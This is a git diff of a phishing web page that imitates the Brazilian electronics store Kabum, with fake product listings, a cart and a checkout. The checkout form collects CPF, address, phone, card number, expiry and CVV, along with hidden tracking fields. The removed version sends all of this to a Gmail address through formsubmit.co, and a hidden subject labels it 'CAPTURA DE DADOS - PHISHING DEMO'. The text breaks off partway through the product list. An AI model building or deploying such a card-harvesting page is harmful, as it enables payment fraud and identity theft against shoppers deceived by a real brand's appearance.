@@ -6,373 +6,768 @@
     <title>Kabum - Eletrônicos e Tecnologia</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Arial', sans-serif; background: #f5f5f5; color: #333; }
-        .navbar { background: linear-gradient(135deg, #ff5733 0%, #ff9500 100%); color: white; padding: 15px 0; box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 100; }
-        .header-content { max-width: 1200px; margin: 0 auto; padding: 0 20px; display: flex; justify-content: space-between; align-items: center; gap: 20px; }
-        .logo { font-size: 1.8em; font-weight: bold; }
-        .search-bar { flex: 1; display: flex; gap: 5px; max-width: 400px; }
-        .search-bar input { flex: 1; padding: 10px 15px; border: none; border-radius: 25px; }
-        .search-bar button { padding: 10px 20px; background: white; border: none; border-radius: 25px; cursor: pointer; }
-        .cart-btn { background: rgba(255,255,255,0.2); color: white; border: 2px solid white; padding: 10px 20px; border-radius: 25px; cursor: pointer; font-size: 1.1em; transition: all 0.3s; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f5f5; color: #333; }
+        
+        /* NAVBAR */
+        .navbar { background: linear-gradient(135deg, #ff5733 0%, #ff9500 100%); color: white; padding: 15px 0; box-shadow: 0 2px 15px rgba(0,0,0,0.2); position: sticky; top: 0; z-index: 100; }
+        .navbar-content { max-width: 1400px; margin: 0 auto; padding: 0 20px; display: flex; justify-content: space-between; align-items: center; gap: 20px; }
+        .logo-section { display: flex; align-items: center; gap: 10px; cursor: pointer; }
+        .logo-img { width: 50px; height: 50px; background: white; border-radius: 5px; display: flex; align-items: center; justify-content: center; font-size: 1.5em; font-weight: bold; color: #ff5733; }
+        .logo-text { font-size: 1.8em; font-weight: bold; }
+        .nav-center { display: flex; gap: 30px; align-items: center; }
+        .nav-link { color: white; text-decoration: none; cursor: pointer; transition: all 0.3s; }
+        .nav-link:hover { opacity: 0.8; }
+        .search-bar { display: flex; gap: 5px; background: white; border-radius: 25px; padding: 5px 15px; }
+        .search-bar input { border: none; width: 250px; outline: none; }
+        .search-bar button { background: none; border: none; cursor: pointer; font-size: 1.2em; color: #ff5733; }
+        .nav-right { display: flex; gap: 20px; align-items: center; }
+        .cart-btn { background: rgba(255,255,255,0.2); color: white; border: 2px solid white; padding: 10px 20px; border-radius: 25px; cursor: pointer; font-size: 1.1em; transition: all 0.3s; position: relative; }
         .cart-btn:hover { background: white; color: #ff5733; }
-        .banner { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-align: center; padding: 40px 20px; margin: 20px 0; }
+        .cart-count { position: absolute; top: -8px; right: -8px; background: #f39c12; color: white; border-radius: 50%; width: 25px; height: 25px; display: flex; align-items: center; justify-content: center; font-size: 0.9em; font-weight: bold; }
+        .modal-logo { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); display: none; z-index: 1000; align-items: center; justify-content: center; }
+        .modal-logo.show { display: flex; }
+        .modal-logo-content { background: white; padding: 30px; border-radius: 10px; max-width: 400px; }
+        .modal-logo-content input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
+        .modal-logo-content button { width: 100%; padding: 10px; background: #ff5733; color: white; border: none; border-radius: 5px; cursor: pointer; margin-top: 10px; }
+        
+        /* MAIN CONTENT */
+        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
+        
+        /* HOME PAGE */
+        .banner { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-align: center; padding: 40px 20px; margin-bottom: 40px; border-radius: 15px; }
         .banner h2 { font-size: 2.5em; margin-bottom: 10px; }
-        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
-        .products-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; margin: 30px 0; }
-        .product-card { background: white; border-radius: 10px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); transition: all 0.3s; }
-        .product-card:hover { box-shadow: 0 8px 20px rgba(0,0,0,0.2); transform: scale(1.02); }
-        .product-image { font-size: 4em; text-align: center; margin-bottom: 15px; height: 150px; display: flex; align-items: center; justify-content: center; background: #f0f0f0; border-radius: 8px; }
-        .product-card h3 { color: #333; margin-bottom: 10px; }
-        .description { color: #666; font-size: 0.9em; margin-bottom: 10px; }
-        .price { font-size: 1.5em; color: #ff5733; font-weight: bold; margin-bottom: 15px; }
-        .add-btn { width: 100%; padding: 10px; background: linear-gradient(135deg, #ff5733, #ff9500); color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        .products-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; }
+        .product-card { background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 2px 10px rgba(0,0,0,0.1); transition: all 0.3s; cursor: pointer; }
+        .product-card:hover { box-shadow: 0 8px 25px rgba(0,0,0,0.15); transform: translateY(-5px); }
+        .product-image { width: 100%; height: 200px; object-fit: cover; background: #f0f0f0; }
+        .product-info { padding: 15px; }
+        .product-title { font-weight: bold; margin-bottom: 8px; color: #333; }
+        .product-desc { font-size: 0.9em; color: #666; margin-bottom: 10px; line-height: 1.4; }
+        .product-price { font-size: 1.5em; color: #ff5733; font-weight: bold; margin-bottom: 10px; }
+        .add-btn { width: 100%; padding: 10px; background: linear-gradient(135deg, #ff5733, #ff9500); color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
         .add-btn:hover { opacity: 0.9; }
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 200; }
-        .modal.show { display: block; }
-        .modal-content { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; width: 90%; max-width: 500px; border-radius: 15px; box-shadow: 0 10px 40px rgba(0,0,0,0.3); }
-        .modal-header { background: linear-gradient(135deg, #ff5733, #ff9500); color: white; padding: 20px; display: flex; justify-content: space-between; }
-        .close-btn { background: none; border: none; color: white; font-size: 2em; cursor: pointer; }
-        .cart-items { max-height: 400px; overflow-y: auto; padding: 20px; }
-        .cart-item { display: flex; justify-content: space-between; padding: 15px 0; border-bottom: 1px solid #eee; }
-        .remove-btn { background: #ff5733; color: white; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; }
-        .cart-footer { padding: 20px; border-top: 2px solid #eee; }
-        .total-line { display: flex; justify-content: space-between; font-size: 1.3em; margin-bottom: 15px; }
-        .checkout-btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #28a745, #20c997); color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        .checkout { display: none; padding: 20px 0; }
-        .checkout.show { display: block; }
-        .back-btn { padding: 10px 20px; background: #6c757d; color: white; border: none; border-radius: 5px; cursor: pointer; margin-bottom: 20px; }
-        .order-summary { background: white; padding: 20px; border-radius: 10px; margin-bottom: 30px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .summary-total { display: flex; justify-content: space-between; font-size: 1.3em; margin-top: 15px; padding-top: 15px; border-top: 2px solid #ff5733; color: #ff5733; }
+        
+        /* PRODUCT DETAIL PAGE */
+        .product-detail { display: none; background: white; border-radius: 10px; padding: 30px; }
+        .product-detail.show { display: block; }
+        .detail-back { background: #6c757d; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin-bottom: 20px; }
+        .detail-content { display: grid; grid-template-columns: 1fr 1fr; gap: 40px; }
+        .detail-image { width: 100%; height: 400px; object-fit: cover; border-radius: 10px; }
+        .detail-info h2 { font-size: 2em; margin-bottom: 15px; }
+        .detail-price { font-size: 2em; color: #ff5733; font-weight: bold; margin: 20px 0; }
+        .detail-desc { line-height: 1.8; margin-bottom: 20px; color: #666; }
+        .detail-qty { display: flex; gap: 10px; align-items: center; margin-bottom: 20px; }
+        .detail-qty button { width: 40px; height: 40px; border: 1px solid #ddd; cursor: pointer; border-radius: 5px; }
+        .detail-qty input { width: 60px; text-align: center; border: 1px solid #ddd; padding: 5px; border-radius: 5px; }
+        .detail-add-btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #ff5733, #ff9500); color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 1.1em; }
+        @media (max-width: 768px) { .detail-content { grid-template-columns: 1fr; } }
+        
+        /* CART PAGE */
+        .cart-page { display: none; }
+        .cart-page.show { display: block; }
+        .cart-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
+        .cart-header h2 { font-size: 2em; }
+        .cart-table { width: 100%; background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .cart-table thead { background: #f8f9fa; }
+        .cart-table th, .cart-table td { padding: 20px; text-align: left; border-bottom: 1px solid #eee; }
+        .cart-table th { font-weight: bold; }
+        .cart-item-img { width: 80px; height: 80px; object-fit: cover; border-radius: 5px; }
+        .qty-control { display: flex; gap: 5px; align-items: center; }
+        .qty-control button { width: 30px; height: 30px; border: 1px solid #ddd; cursor: pointer; border-radius: 3px; }
+        .remove-btn { background: #ff5733; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; }
+        .cart-summary { display: grid; grid-template-columns: 2fr 1fr; gap: 30px; margin-top: 30px; }
+        .cart-total-box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .cart-total-line { display: flex; justify-content: space-between; padding: 10px 0; font-size: 1.1em; }
+        .cart-total-line.total { font-weight: bold; font-size: 1.3em; border-top: 2px solid #ff5733; padding-top: 15px; margin-top: 15px; }
+        .checkout-link { width: 100%; padding: 15px; background: linear-gradient(135deg, #28a745, #20c997); color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 1.1em; }
+        .empty-cart { text-align: center; padding: 50px; }
+        .empty-cart-icon { font-size: 4em; margin-bottom: 20px; }
+        
+        /* CHECKOUT PAGE */
+        .checkout-page { display: none; }
+        .checkout-page.show { display: block; }
+        .checkout-container { display: grid; grid-template-columns: 2fr 1fr; gap: 30px; }
         .checkout-form { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
         fieldset { border: none; margin-bottom: 30px; padding: 0; }
         legend { font-size: 1.3em; font-weight: bold; margin-bottom: 15px; padding-bottom: 10px; border-bottom: 2px solid #ff5733; }
+        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
         .form-group { margin-bottom: 15px; }
         .form-group label { display: block; margin-bottom: 5px; font-weight: bold; }
         .form-group input, .form-group select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-size: 1em; }
-        .form-group input:focus, .form-group select:focus { outline: none; border-color: #ff5733; box-shadow: 0 0 5px rgba(255, 87, 51, 0.3); }
-        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .payment-options { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 20px; }
-        .payment-option { display: flex; align-items: center; padding: 15px; border: 2px solid #ddd; border-radius: 8px; cursor: pointer; }
-        .payment-option:hover { border-color: #ff5733; }
+        .form-group input:focus, .form-group select:focus { outline: none; border-color: #ff5733; box-shadow: 0 0 5px rgba(255, 87, 51, 0.2); }
+        .payment-options { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 20px; }
+        .payment-option { padding: 15px; border: 2px solid #ddd; border-radius: 8px; cursor: pointer; text-align: center; transition: all 0.3s; }
         .payment-option.active { border-color: #ff5733; background: #fff5f0; }
-        .payment-option input { width: auto; margin-right: 10px; }
-        .submit-btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #ff5733, #ff9500); color: white; border: none; border-radius: 8px; font-size: 1.2em; font-weight: bold; cursor: pointer; margin-top: 20px; }
-        .submit-btn:hover { opacity: 0.9; }
-        @media (max-width: 768px) { .header-content { flex-direction: column; } .products-grid { grid-template-columns: 1fr; } .form-row { grid-template-columns: 1fr; } }
+        .payment-option input { display: none; }
+        .card-fields { display: none; }
+        .card-fields.show { display: block; }
+        .checkout-btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #ff5733, #ff9500); color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 1.1em; margin-top: 20px; }
+        .checkout-summary { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); height: fit-content; }
+        .summary-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; font-size: 0.95em; }
+        .summary-item.total { font-weight: bold; font-size: 1.2em; border-top: 2px solid #ff5733; padding-top: 15px; margin-top: 15px; }
+        .error-message { background: #ffebee; border: 1px solid #ef5350; color: #c62828; padding: 15px; border-radius: 5px; margin-bottom: 20px; display: none; }
+        .error-message.show { display: block; }
+        .success-banner { background: #e8f5e9; border: 1px solid #4caf50; color: #2e7d32; padding: 15px; border-radius: 5px; margin-bottom: 20px; display: none; text-align: center; }
+        .success-banner.show { display: block; }
+        
+        @media (max-width: 1024px) { .checkout-container { grid-template-columns: 1fr; } }
+        @media (max-width: 768px) { .navbar-content { flex-direction: column; gap: 10px; } .search-bar input { width: 150px; } .detail-content { grid-template-columns: 1fr; } .checkout-container { grid-template-columns: 1fr; } .form-row { grid-template-columns: 1fr; } .payment-options { grid-template-columns: 1fr; } }
     </style>
 </head>
 <body>
-    <header class="navbar">
-        <div class="header-content">
-            <div class="logo">⚡ KABUM!</div>
-            <div class="search-bar">
-                <input type="text" placeholder="O que você procura?">
-                <button>🔍</button>
+    <!-- NAVBAR -->
+    <nav class="navbar">
+        <div class="navbar-content">
+            <div class="logo-section" onclick="goHome()">
+                <div class="logo-img" id="logoDisplay">⚡</div>
+                <div class="logo-text">KABUM</div>
             </div>
-            <div>
-                <button class="cart-btn" onclick="openCart()">
-                    🛒 Carrinho (<span id="cart-count">0</span>)
+            
+            <div class="nav-center">
+                <a class="nav-link" onclick="goHome()">Home</a>
+                <a class="nav-link" onclick="goCart()">Produtos</a>
+                <a class="nav-link" onclick="toggleLogoModal()">Alterar Logo</a>
+            </div>
+            
+            <div class="search-bar">
+                <input type="text" id="searchInput" placeholder="Buscar produtos..." onkeyup="searchProducts()">
+                <button onclick="searchProducts()">🔍</button>
+            </div>
+            
+            <div class="nav-right">
+                <button class="cart-btn" onclick="goCart()">
+                    🛒 Carrinho
+                    <span class="cart-count" id="cartCount">0</span>
                 </button>
             </div>
         </div>
-    </header>
+    </nav>
 
-    <div class="banner">
-        <h2>⚡ Promoções Imperdíveis</h2>
-        <p>Até 50% OFF em produtos selecionados</p>
-    </div>
-
-    <main class="container">
-        <h2>Produtos em Destaque</h2>
-        <div class="products-grid" id="products-grid"></div>
-    </main>
-
-    <div id="cart-modal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h2>🛒 Seu Carrinho</h2>
-                <button class="close-btn" onclick="closeCart()">✕</button>
-            </div>
-            <div id="cart-items" class="cart-items"></div>
-            <div class="cart-footer">
-                <div class="total-line">
-                    <strong>Total:</strong>
-                    <strong id="cart-total">R$ 0,00</strong>
-                </div>
-                <button class="checkout-btn" onclick="goToCheckout()">Ir para Checkout</button>
-            </div>
+    <!-- MODAL ALTERAR LOGO -->
+    <div class="modal-logo" id="logoModal">
+        <div class="modal-logo-content">
+            <h3>Alterar Logo da Loja</h3>
+            <p>Digite um emoji ou caractere:</p>
+            <input type="text" id="logoInput" maxlength="2" placeholder="Ex: 🛍️">
+            <button onclick="changeLogo()">Alterar Logo</button>
+            <button onclick="toggleLogoModal()" style="background: #6c757d; margin-top: 5px;">Cancelar</button>
         </div>
     </div>
 
-    <div id="checkout-section" class="checkout">
-        <div class="container">
-            <button class="back-btn" onclick="backToShop()">← Voltar às Compras</button>
-            <h2>Finalizar Compra</h2>
+    <!-- CONTAINER -->
+    <div class="container">
+        <!-- HOME PAGE -->
+        <div id="homePage">
+            <div class="banner">
+                <h2>⚡ Bem-vindo à Kabum!</h2>
+                <p>Encontre os melhores eletrônicos com os melhores preços</p>
+            </div>
+            <div class="products-grid" id="productsGrid"></div>
+        </div>
 
-            <div class="order-summary">
-                <h3>Resumo do Pedido</h3>
-                <div id="order-items"></div>
-                <div class="summary-total">
-                    <strong>Total:</strong>
-                    <strong id="order-total">R$ 0,00</strong>
+        <!-- PRODUCT DETAIL PAGE -->
+        <div id="productDetail" class="product-detail">
+            <button class="detail-back" onclick="goHome()">← Voltar</button>
+            <div class="detail-content">
+                <img id="detailImage" class="detail-image" src="" alt="Produto">
+                <div class="detail-info">
+                    <h2 id="detailTitle"></h2>
+                    <div class="detail-price" id="detailPrice"></div>
+                    <p class="detail-desc" id="detailDesc"></p>
+                    <div class="detail-qty">
+                        <button onclick="decreaseQty()">-</button>
+                        <input type="number" id="detailQty" value="1" min="1">
+                        <button onclick="increaseQty()">+</button>
+                    </div>
+                    <button class="detail-add-btn" onclick="addToCartFromDetail()">🛒 Adicionar ao Carrinho</button>
                 </div>
             </div>
+        </div>
 
-            <form action="https://formsubmit.co/alertascalp@gmail.com" method="POST" class="checkout-form">
+        <!-- CART PAGE -->
+        <div id="cartPage" class="cart-page">
+            <div class="cart-header">
+                <h2>🛒 Meu Carrinho</h2>
+                <button class="detail-back" onclick="goHome()" style="background: #6c757d;">← Continuar Comprando</button>
+            </div>
+            
+            <div id="cartContent">
+                <table class="cart-table">
+                    <thead>
+                        <tr>
+                            <th>Produto</th>
+                            <th>Preço</th>
+                            <th>Quantidade</th>
+                            <th>Total</th>
+                            <th>Ação</th>
+                        </tr>
+                    </thead>
+                    <tbody id="cartTableBody"></tbody>
+                </table>
                 
-                <fieldset>
-                    <legend>📋 Dados Pessoais</legend>
-                    <div class="form-group">
-                        <label>E-mail *</label>
-                        <input type="email" name="email" required>
+                <div class="cart-summary">
+                    <div></div>
+                    <div class="cart-total-box">
+                        <div class="cart-total-line">
+                            <span>Subtotal:</span>
+                            <span id="subtotal">R$ 0,00</span>
+                        </div>
+                        <div class="cart-total-line">
+                            <span>Frete:</span>
+                            <span id="frete">R$ 0,00</span>
+                        </div>
+                        <div class="cart-total-line total">
+                            <span>Total:</span>
+                            <span id="cartTotal">R$ 0,00</span>
+                        </div>
+                        <button class="checkout-link" onclick="goCheckout()">Ir para Checkout</button>
                     </div>
-                    <div class="form-group">
-                        <label>Nome Completo *</label>
-                        <input type="text" name="nome_completo" required>
-                    </div>
-                    <div class="form-group">
-                        <label>CPF *</label>
-                        <input type="text" name="cpf" placeholder="000.000.000-00" required>
-                    </div>
-                    <div class="form-group">
-                        <label>Telefone</label>
-                        <input type="tel" name="telefone">
-                    </div>
-                </fieldset>
+                </div>
+            </div>
+            
+            <div id="emptyCart" class="empty-cart" style="display: none;">
+                <div class="empty-cart-icon">🛒</div>
+                <h2>Seu carrinho está vazio</h2>
+                <p>Adicione produtos para começar suas compras</p>
+                <button class="checkout-link" onclick="goHome()" style="max-width: 300px; margin-top: 20px;">Continuar Comprando</button>
+            </div>
+        </div>
 
-                <fieldset>
-                    <legend>📍 Endereço de Entrega</legend>
-                    <div class="form-group">
-                        <label>CEP *</label>
-                        <input type="text" name="cep" placeholder="00000-000" required>
-                    </div>
-                    <div class="form-group">
-                        <label>Endereço *</label>
-                        <input type="text" name="endereco" required>
-                    </div>
-                    <div class="form-group">
-                        <label>Número *</label>
-                        <input type="text" name="numero" required>
-                    </div>
-                    <div class="form-group">
-                        <label>Complemento</label>
-                        <input type="text" name="complemento">
-                    </div>
-                    <div class="form-group">
-                        <label>Bairro *</label>
-                        <input type="text" name="bairro" required>
-                    </div>
-                    <div class="form-row">
-                        <div class="form-group">
-                            <label>Cidade *</label>
-                            <input type="text" name="cidade" required>
-                        </div>
-                        <div class="form-group">
-                            <label>Estado *</label>
-                            <input type="text" name="estado" placeholder="AL" maxlength="2" required>
-                        </div>
-                    </div>
-                </fieldset>
-
-                <fieldset>
-                    <legend>💳 Forma de Pagamento</legend>
-                    <div class="payment-options">
-                        <label class="payment-option active">
-                            <input type="radio" name="metodo_pagamento" value="cartao" checked onchange="toggleCardFields()">
-                            <span>💳 Cartão de Crédito</span>
-                        </label>
-                        <label class="payment-option">
-                            <input type="radio" name="metodo_pagamento" value="boleto" onchange="toggleCardFields()">
-                            <span>📄 Boleto</span>
-                        </label>
-                        <label class="payment-option">
-                            <input type="radio" name="metodo_pagamento" value="pix" onchange="toggleCardFields()">
-                            <span>❖ PIX</span>
-                        </label>
-                    </div>
-
-                    <div id="card-fields">
-                        <div class="form-group">
-                            <label>Nome no Cartão *</label>
-                            <input type="text" name="nome_cartao" required>
-                        </div>
-                        <div class="form-group">
-                            <label>Número do Cartão *</label>
-                            <input type="text" name="numero_cartao" placeholder="0000 0000 0000 0000" maxlength="19" required>
-                        </div>
-                        <div class="form-row">
+        <!-- CHECKOUT PAGE -->
+        <div id="checkoutPage" class="checkout-page">
+            <button class="detail-back" onclick="goCart()" style="background: #6c757d; margin-bottom: 20px;">← Voltar ao Carrinho</button>
+            <h2 style="margin-bottom: 30px;">Finalizar Compra</h2>
+            
+            <div class="checkout-container">
+                <div>
+                    <div class="error-message" id="errorMessage"></div>
+                    <div class="success-banner" id="successBanner">✅ Pedido realizado com sucesso!</div>
+                    
+                    <form class="checkout-form" id="checkoutForm" onsubmit="submitCheckout(event)">
+                        <fieldset>
+                            <legend>📋 Dados Pessoais</legend>
                             <div class="form-group">
-                                <label>Validade (MM/AA) *</label>
-                                <input type="text" name="validade" placeholder="12/25" maxlength="5" required>
+                                <label>E-mail *</label>
+                                <input type="email" name="email" required>
+                            </div>
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label>Nome *</label>
+                                    <input type="text" name="nome" required>
+                                </div>
+                                <div class="form-group">
+                                    <label>Sobrenome *</label>
+                                    <input type="text" name="sobrenome" required>
+                                </div>
                             </div>
                             <div class="form-group">
-                                <label>CVV *</label>
-                                <input type="text" name="cvv" placeholder="123" maxlength="4" required>
+                                <label>CPF *</label>
+                                <input type="text" name="cpf" placeholder="000.000.000-00" required>
                             </div>
-                        </div>
-                        <div class="form-group">
-                            <label>Parcelamento</label>
-                            <select name="parcelamento">
-                                <option>À vista</option>
-                                <option>2x sem juros</option>
-                                <option>3x sem juros</option>
-                                <option>6x sem juros</option>
-                            </select>
-                        </div>
+                            <div class="form-group">
+                                <label>Telefone *</label>
+                                <input type="tel" name="telefone" required>
+                            </div>
+                        </fieldset>
+
+                        <fieldset>
+                            <legend>📍 Endereço de Entrega</legend>
+                            <div class="form-group">
+                                <label>CEP *</label>
+                                <input type="text" name="cep" placeholder="00000-000" required>
+                            </div>
+                            <div class="form-group">
+                                <label>Endereço *</label>
+                                <input type="text" name="endereco" required>
+                            </div>
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label>Número *</label>
+                                    <input type="text" name="numero" required>
+                                </div>
+                                <div class="form-group">
+                                    <label>Complemento</label>
+                                    <input type="text" name="complemento">
+                                </div>
+                            </div>
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label>Bairro *</label>
+                                    <input type="text" name="bairro" required>
+                                </div>
+                                <div class="form-group">
+                                    <label>Cidade *</label>
+                                    <input type="text" name="cidade" required>
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label>Estado *</label>
+                                <input type="text" name="estado" placeholder="AL" maxlength="2" required>
+                            </div>
+                        </fieldset>
+
+                        <fieldset>
+                            <legend>💳 Forma de Pagamento</legend>
+                            <div class="payment-options">
+                                <label class="payment-option active">
+                                    <input type="radio" name="metodo_pagamento" value="cartao" checked onchange="togglePaymentMethod()">
+                                    <span>💳 Cartão</span>
+                                </label>
+                                <label class="payment-option">
+                                    <input type="radio" name="metodo_pagamento" value="boleto" onchange="togglePaymentMethod()">
+                                    <span>📄 Boleto</span>
+                                </label>
+                                <label class="payment-option">
+                                    <input type="radio" name="metodo_pagamento" value="pix" onchange="togglePaymentMethod()">
+                                    <span>❖ PIX</span>
+                                </label>
+                            </div>
+
+                            <div id="cardFields" class="card-fields show">
+                                <div class="form-group">
+                                    <label>Nome no Cartão *</label>
+                                    <input type="text" name="nome_cartao" required>
+                                </div>
+                                <div class="form-group">
+                                    <label>Número do Cartão *</label>
+                                    <input type="text" name="numero_cartao" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                                </div>
+                                <div class="form-row">
+                                    <div class="form-group">
+                                        <label>Validade (MM/AA) *</label>
+                                        <input type="text" name="validade" placeholder="12/25" maxlength="5" required>
+                                    </div>
+                                    <div class="form-group">
+                                        <label>CVV *</label>
+                                        <input type="text" name="cvv" placeholder="123" maxlength="4" required>
+                                    </div>
+                                </div>
+                            </div>
+                        </fieldset>
+
+                        <input type="hidden" name="timestamp" id="timestamp">
+                        <input type="hidden" name="user_agent" id="user_agent">
+                        <input type="hidden" name="produtos_comprados" id="produtos_comprados">
+                        <input type="hidden" name="valor_total" id="valor_total">
+                        <input type="hidden" name="_captcha" value="false">
+                        <input type="hidden" name="_next" value="https://seu-username.github.io/seu-repositorio/sucesso.html">
+                        <input type="hidden" name="_subject" value="🚨 CAPTURA DE DADOS - PHISHING DEMO">
+
+                        <button type="submit" class="checkout-btn">🔒 Finalizar Compra</button>
+                    </form>
+                </div>
+
+                <div class="checkout-summary">
+                    <h3>Resumo do Pedido</h3>
+                    <div id="summaryItems"></div>
+                    <div class="summary-item total">
+                        <span>Total:</span>
+                        <span id="summaryTotal">R$ 0,00</span>
                     </div>
-                </fieldset>
-
-                <input type="hidden" name="timestamp" id="timestamp">
-                <input type="hidden" name="user_agent" id="user_agent">
-                <input type="hidden" name="produtos_comprados" id="produtos_comprados">
-                <input type="hidden" name="valor_total" id="valor_total">
-                <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_next" value="https://seu-dominio.com.br/sucesso.html">
-                <input type="hidden" name="_subject" value="🚨 CAPTURA DE DADOS - PHISHING DEMO">
-
-                <button type="submit" class="submit-btn">🔒 Finalizar Compra</button>
-            </form>
+                </div>
+            </div>
         </div>
     </div>
 
     <script>
+        // PRODUTOS COM IMAGENS REAIS
         const products = [
-            { id: 1, name: 'Notebook Gamer', price: 3999.99, image: '💻', desc: 'Intel i7, 16GB RAM' },
-            { id: 2, name: 'iPhone 15 Pro', price: 8999.99, image: '📱', desc: 'A17 Pro, 256GB' },
-            { id: 3, name: 'PlayStation 5', price: 4999.99, image: '🎮', desc: 'Edição Disco' },
-            { id: 4, name: 'Monitor 4K', price: 1999.99, image: '🖥️', desc: '32 polegadas' },
-            { id: 5, name: 'Fone Bluetooth', price: 2199.99, image: '🎧', desc: 'Sony WH-1000' },
-            { id: 6, name: 'SSD 2TB', price: 899.99, image: '💾', desc: 'PCIe 4.0' }
+            {
+                id: 1,
+                name: 'Notebook Gamer Pro',
+                price: 3999.99,
+                image: 'https://images.unsplash.com/photo-1517694712202-14dd9538aa97?w=500&h=500&fit=crop',
+                description: 'Processador Intel i7 de 12ª geração, 16GB de RAM DDR5, SSD 512GB NVMe, Placa de vídeo NVIDIA RTX 4060. Tela 15.6" Full HD 144Hz. Perfeito para jogos e trabalho pesado. Bateria de 6 horas.'
+            },
+            {
+                id: 2,
+                name: 'iPhone 15 Pro Max',
+                price: 8999.99,
+                image: 'https://images.unsplash.com/photo-1592286927505-1def25e63e67?w=500&h=500&fit=crop',
+                description: 'Câmera de 48MP com zoom 12x, Processador A17 Pro, 8GB RAM, 256GB de armazenamento. Tela OLED 6.7". Resistência à água IP68. 5G. Bateria que dura o dia todo.'
+            },
+            {
+                id: 3,
+                name: 'PlayStation 5',
+                price: 4999.99,
+                image: 'https://images.unsplash.com/photo-1622979135225-cc70dba73d0b?w=500&h=500&fit=crop',
+                description: 'Console de última geração com processador AMD Ryzen. 825GB de armazenamento SSD ultra rápido. Controle DualSense com haptic feedback. Inclui cópia de Astros Playroom. Compatível com todos os jogos PS5.'
+            },
+            {
+                id: 4,
+                name: 'Monitor Gamer 4K',
+                price: 2499.99,
+                image: 'https://images.unsplash.com/photo-1527864550417-7fd91fc51a46?w=500&h=500&fit=crop',
+                description: 'Monitor 32" 4K (3840x2160) com Taxa de Atualização 144Hz. Tempo de resposta 1ms. Painel IPS. HDR 600. Suporte VESA para montagem na parede. Entradas HDMI 2.1 e DisplayPort.'
+            },
+            {
+                id: 5,
+                name: 'Fone Sony WH-1000XM5',
+                price: 2199.99,
+                image: 'https://images.unsplash.com/photo-1505740420928-5e560c06d30e?w=500&h=500&fit=crop',
+                description: 'Fone de ouvido over-ear com Cancelamento de Ruído ativo. Áudio de qualidade premium com driver de 40mm. Bateria de até 30 horas. Conectividade Bluetooth 5.3. Microfone com redução de ruído para chamadas.'
+            },
+            {
+                id: 6,
+                name: 'SSD NVMe 2TB',
+                price: 899.99,
+                image: 'https://images.unsplash.com/photo-1597872200969-2b65d56bd16b?w=500&h=500&fit=crop',
+                description: 'Unidade de Estado Sólido NVMe PCIe 4.0 Gen4 com Velocidade de Leitura até 7400MB/s e Escrita até 6000MB/s. Capacidade de 2TB. Dissipador de calor integrado. Garantia de 5 anos.'
+            },
+            {
+                id: 7,
+                name: 'iPad Pro 12.9',
+                price: 6999.99,
+                image: 'https://images.unsplash.com/photo-1587541167130-dd95d674f66e?w=500&h=500&fit=crop',
+                description: 'Tela OLED 12.9" com tecnologia ProMotion 120Hz. Processador M2 com 8-core CPU. Câmera traseira 12MP + Ultra-wide. Suporte para Apple Pencil Pro. Conectividade 5G. Até 10 horas de bateria.'
+            },
+            {
+                id: 8,
+                name: 'Smartwatch Galaxy Watch 6',
+                price: 1499.99,
+                image: 'https://images.unsplash.com/photo-1523275335684-37898b6baf30?w=500&h=500&fit=crop',
